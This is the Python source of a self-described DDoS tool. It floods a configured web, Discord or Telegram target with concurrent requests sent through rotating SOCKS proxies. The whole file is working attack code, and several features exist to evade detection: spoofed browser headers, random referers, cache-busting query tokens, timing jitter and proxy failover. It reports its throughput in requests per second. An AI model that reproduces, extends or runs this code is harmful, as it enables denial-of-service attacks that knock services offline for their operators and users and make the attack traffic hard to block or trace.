"""
DDOS-TOOL — worst

Author / Developer / Admin / Owner: Aashu
GitHub:  @outwiles
Telegram: @outwiles
Email:   outwiles@proton.me

License: MIT
"""

import asyncio
import random
import string
import sys
import time
from pathlib import Path
from urllib.parse import urlparse, urlencode, urlunparse, parse_qsl

import aiohttp
import yaml
from aiohttp_socks import ProxyConnector


IS_WINDOWS = sys.platform.startswith("win")

UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.3; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
]

ACCEPT_LANGS = [
    "en-US,en;q=0.9",
    "en-GB,en;q=0.9",
    "en-US,en;q=0.9,es;q=0.8",
    "de-DE,de;q=0.9,en;q=0.8",
]

REFERERS = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://duckduckgo.com/",
    "https://t.co/",
]


def rand_token(n: int = 10) -> str:
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


def build_headers(target_type: str) -> dict:
    h = {
        "User-Agent": random.choice(UA_POOL),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": random.choice(ACCEPT_LANGS),
        "Accept-Encoding": "gzip, deflate, br",
        "Referer": random.choice(REFERERS),
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Cache-Control": "no-cache",
        "X-Request-Id": rand_token(16),
        "X-Client-Trace": rand_token(8),
    }
    if target_type == "discord":
        h["Content-Type"] = "application/json"
    elif target_type == "telegram":
        h["Content-Type"] = "application/x-www-form-urlencoded"
    return h


class ProxyRing:
    def __init__(self, path: str, max_fail: int = 2):
        self.path = Path(path)
        self.max_fail = max_fail
        self.ring: list[str] = []
        self.fails: dict[str, int] = {}
        self.idx = 0
        self.lock = asyncio.Lock()

    def load(self) -> int:
        if not self.path.exists():
            raise FileNotFoundError(f"proxy file missing: {self.path}")
        raw = [ln.strip() for ln in self.path.read_text().splitlines()]
        self.ring = [ln for ln in raw if ln and not ln.startswith("#")]
        return len(self.ring)

    async def next(self) -> str | None:
        async with self.lock:
            if not self.ring:
                return None
            for _ in range(len(self.ring)):
                url = self.ring[self.idx % len(self.ring)]
                self.idx += 1
                if self.fails.get(url, 0) < self.max_fail:
                    return url
            return None

    async def fail(self, url: str):
        async with self.lock:
            self.fails[url] = self.fails.get(url, 0) + 1

    async def ok(self, url: str):
        async with self.lock:
            self.fails[url] = 0

    def alive(self) -> int:
        return sum(1 for u in self.ring if self.fails.get(u, 0) < self.max_fail)


class Runner:
    def __init__(self, cfg: dict, ring: ProxyRing):
        self.cfg = cfg
        self.ring = ring
        self.sent = 0
        self.failed = 0
        self.bytes_out = 0
        self._stop = False
        self._lock = asyncio.Lock()
        self._last_report = time.time()
        self._last_sent = 0

    def _bust(self, base: str) -> str:
        p = urlparse(base)
        q = parse_qsl(p.query)
        q.append(("_", rand_token(8)))
        return urlunparse(p._replace(query=urlencode(q)))

    async def fire(self, target: dict, session_cache: dict, connector_cache: dict):
        proxy_url = await self.ring.next()
        if proxy_url is None:
            self._stop = True
            return

        connector = connector_cache.get(proxy_url)
        if connector is None:
            connector = ProxyConnector.from_url(proxy_url, rdns=True, limit=0, limit_per_host=0)
            connector_cache[proxy_url] = connector

        session = session_cache.get(proxy_url)
        if session is None or session.closed:
            session = aiohttp.ClientSession(
                connector=connector,
                timeout=aiohttp.ClientTimeout(total=self.cfg["attack"]["timeout_sec"]),
                auto_decompress=False,
                skip_auto_headers={"Accept-Encoding"},
            )
            session_cache[proxy_url] = session

        url = self._bust(target["url"]) if self.cfg["attack"]["cache_buster"] else target["url"]
        headers = build_headers(target.get("type", "http"))

        try:
            method = "POST" if target.get("type") == "discord" else "GET"
            data = b"{}" if method == "POST" else None
            async with session.request(method, url, headers=headers, data=data, allow_redirects=False) as r:
                await r.read()
            await self.ring.ok(proxy_url)
            async with self._lock:
                self.sent += 1
                self.bytes_out += len(url) + 400
        except Exception:
            await self.ring.fail(proxy_url)
            async with self._lock:
                self.failed += 1

    async def worker(self, target: dict, session_cache: dict, connector_cache: dict, deadline: float):
        jmin, jmax = self.cfg["obfuscation"]["jitter_ms"]
        while time.time() < deadline and not self._stop:
            await self.fire(target, session_cache, connector_cache)
            if jmax:
                await asyncio.sleep(random.uniform(jmin, jmax) / 1000.0)

    async def reporter(self, deadline: float):
        every = self.cfg["logging"].get("report_every_sec", 5)
        while time.time() < deadline and not self._stop:
            await asyncio.sleep(every)
            now = time.time()
            async with self._lock:
                sent = self.sent
                failed = self.failed
            rps = (sent - self._last_sent) / max(0.001, now - self._last_report)
            self._last_report = now
            self._last_sent = sent
            print(
                f"[{time.strftime('%H:%M:%S')}] sent={sent} failed={failed} "
                f"rps={rps:.0f} alive_proxies={self.ring.alive()}/{len(self.ring.ring)}"
            )

    async def run(self, target: dict) -> dict:
        conc = self.cfg["attack"]["concurrency"]
        deadline = time.time() + self.cfg["attack"]["duration_sec"]
        session_cache: dict = {}
        connector_cache: dict = {}

        tasks = [
            asyncio.create_task(self.worker(target, session_cache, connector_cache, deadline))
            for _ in range(conc)
        ]
        reporter = asyncio.create_task(self.reporter(deadline))

        try:
            await asyncio.gather(*tasks)
        except asyncio.CancelledError:
            self._stop = True
        finally:
            self._stop = True
            reporter.cancel()
            for s in session_cache.values():
                if not s.closed:
                    await s.close()
            for c in connector_cache.values():
                await c.close()

        return {"sent": self.sent, "failed": self.failed, "bytes_out": self.bytes_out}


def load_config(path: str) -> dict:
    with open(path, "r") as f:
        return yaml.safe_load(f)


async def async_main(cfg: dict):
    target = cfg["targets"][0]
    ring = ProxyRing(cfg["proxy"]["file"], cfg["proxy"]["max_failures_before_drop"])
    n = ring.load()
    print(f"loaded {n} proxies")

    runner = Runner(cfg, ring)
    result = await runner.run(target)
    print(f"result: {result}")


def main():
    if IS_WINDOWS:
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    cfg = load_config(sys.argv[1] if len(sys.argv) > 1 else "config.yaml")
    print(f"platform={sys.platform} target={cfg['targets'][0]['name']} vector={cfg['attack']['vector']}")
    asyncio.run(async_main(cfg))


if __name__ == "__main__":
    main()
